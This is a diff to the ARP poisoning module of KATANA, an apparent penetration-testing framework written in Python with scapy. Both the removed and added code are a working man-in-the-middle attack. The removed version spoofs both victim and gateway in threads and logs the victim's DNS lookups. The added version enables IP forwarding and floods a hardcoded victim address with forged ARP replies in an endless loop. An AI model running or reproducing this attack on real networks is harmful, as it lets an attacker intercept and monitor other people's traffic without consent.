@@ -1,30 +1,30 @@
 # :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
 # @KATANA                       #
 # Modules   : ARP Poisoning     #
-# Script by : Unkown            #
+# Script by : RedToor           #
 # Date      : 26/08/2015        #
 # :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
 # Katana Core                   #
 from core.design import *       #
+from core.Setting import *      #
+from core import Errors         #
 from core import help           #
 from core import ping           #
+import sys                      #
 d=DESIGN()                      #
 # :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
 # Libraries                     #
 from scapy.all import *         #
 import threading                #
-import os                       #
 import sys                      #
 # :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
 # Default                       #
 # :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
-defaultipv="127.0.0.1"
-defaultgat="192.168.1.254"
-defaultint="wlan1"
-vthread = []
-defaultgatthread = []  
+defaultipv=MY_IP
+defaultgat=GATEWAY_ADR
+defaultint=INTERFACE_DEVICE
 # :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
-
+ 
 def run(para,parb,parc):
     global defaultgat,defaultipv,defaultint
     defaultipv=para
@@ -41,14 +41,23 @@ def arpp(run):
             actions="run"
         if actions == "show options" or actions == "sop":
             d.option()
-            d.descrip("ipvic","yes","IP victim",defaultipv)
+            d.descrip("target","yes","IP victim",defaultipv)
             d.descrip("gway","yes","Gateway-Router.",defaultgat)
             d.descrip("inter","yes","Interface",defaultint)
+            d.helpAUX()
+            if ping.conneted()!=False:
+                ping.interfaces(1)
+                ping.get_gateway(1)
+                ping.my_mac_address(1)
+                d.space()
+                ping.lan_ips(1)
+            else:
+                print d.noconnect()
             print ""
             arpp(0)
-        elif actions[0:9] == "set ipvic":
-            defaultipv = actions[10:]
-            d.change("ipvic",defaultipv)
+        elif actions[0:10] == "set target":
+            defaultipv = actions[11:]
+            d.change("target",defaultipv)
             arpp(0)
         elif actions[0:8] == "set gway":
             defaultgat = actions[9:]
@@ -70,45 +79,19 @@ def arpp(run):
             d.run()
             try:
                 print " "+Alr+" Ensure the victim recieves packets by forwarding them"
-                os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
-                while True:    
-                    vpoison = threading.Thread(target=v_poison)
-                    vpoison.setDaemon(True)
-                    vthread.append(vpoison)
-                    vpoison.start()        
-                    defaultgatpoison = threading.Thread(target=defaultgat_poison)
-                    defaultgatpoison.setDaemon(True)
-                    defaultgatthread.append(defaultgatpoison)
-                    defaultgatpoison.start()
-                    pkt = sniff(defaultint=defaultint,filter='udp port 53',prn=dnshandle)
-            except(KeyboardInterrupt, SystemExit):
-                d.kbi()
-                os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
+                ping.status_cmd('echo 1 > /proc/sys/net/ipv4/ip_forward','\t')
+                op=1                    # Op code 1 for ARP requests
+                victim="192.168.1.210"  # Replace with Victims IP
+                spoof='192.168.1.254'   # Replace with Gateways IP
+                mac='10:FE:ED:1D:CB:CC' # Replace with Attackers Phys. Addr.
+                arp=ARP(op=op,psrc=spoof,pdst=victim,hwdst=mac)
+                while 1:
+                    print " "+Alr+" Send ARP's packets, Now ",send(arp)
+                    #time.sleep(2)
+            except:
+                Errors.Errors(event=sys.exc_info()[0], info=False)
         else:
-            d.nocommand()
+            d.No_actions()
     except:
-        d.kbi()
-        exit()
+        Errors.Errors(event=sys.exc_info()[0], info=False)
     arpp(0)
-
-
-def dnshandle(pkt):
-                if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0: 
-                        print 'Victim: ' + defaultipv + ' has searched for: ' + pkt.getlayer(DNS).qd.qname
-def v_poison():
-        v = ARP(pdst=defaultipv, psrc=defaultgat)
-        while True:
-                try:   
-                       send(v,verbose=0,inter=1,loop=1)
-                except KeyboardInterupt:                     
-                         sys.exit(1)
-def defaultgat_poison():
-        defaultgat = ARP(pdst=defaultgat, psrc=defaultipv)
-        while True:
-                try:
-                       send(defaultgat,verbose=0,inter=1,loop=1)
-                except KeyboardInterupt:
-                        sys.exit(1)
- 
-
- 
